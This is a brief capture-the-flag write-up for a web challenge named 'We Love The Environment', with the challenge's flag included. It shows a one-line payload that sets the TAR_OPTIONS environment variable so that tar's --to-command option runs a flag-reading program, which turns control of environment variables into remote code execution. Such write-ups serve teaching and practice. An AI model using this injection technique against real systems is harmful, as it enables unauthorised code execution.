# We Love The Environment

### Challenge Details

However we do *not* love challenges with names like nlinephp

### Key Concepts

Having control over environment variables can lead to RCE 

### Solution

`http://<URL>/?prog=tar&var=TAR_OPTIONS&val=--to-command '/readflag GIVEFLAGPLS' -x -f /lib/apk/db/scripts.tar`

Both teams that solved it used the tar binary and the TAR_OPTIONS variable. Are there other working payloads? Who knows...

### Flag
`greyhats{I_doNT_l0vE_you_no_m0rE}`
